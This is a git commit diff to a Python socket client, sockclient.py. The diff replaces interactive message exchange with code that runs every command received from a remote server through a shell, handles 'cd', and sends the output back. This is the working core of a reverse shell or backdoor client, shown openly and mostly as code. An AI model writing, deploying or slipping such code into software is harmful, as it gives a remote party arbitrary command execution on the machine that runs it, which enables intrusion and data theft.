79b7bea6e7042ebccea81b79e49c1ad7fe3fc81c
Luka Babetzki <lukababetzki@proton.me>
2026-01-14 12:56:07 +0000

    Refactor session_handler to improve message handling and command execution. Added hard-coded 'cd' remote execution functionality.

--- sockclient.py
+++ sockclient.py
@@ -1,4 +1,6 @@
 import socket
+import subprocess
+import os
 
 def session_handler():
     print(f'[+] Connecting to {host_ip}.')
@@ -8,16 +10,25 @@ def session_handler():
         try:
             print('[+] Awaiting response...')
             message = sock.recv(1024).decode()
+            print(f'[+] Message received: {message}')
             if message == 'exit':
                 print('[-] The server has terminated the session.')
                 socket.close()
                 break
-            print(message)
-            response = input('Message to send#> ')
-            if response == 'exit':
-                sock.send(response.encode())
-                sock.close()
-                break
+            elif message.split(" ")[0] == 'cd':
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                sock.send(cur_dir.encode())
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                sock.send(output)
+        except KeyboardInterrupt:
+            print('[+] Keyboard interrupt issued.')
+            sock.close()
+            break
         except Exception:
             sock.close()
             break
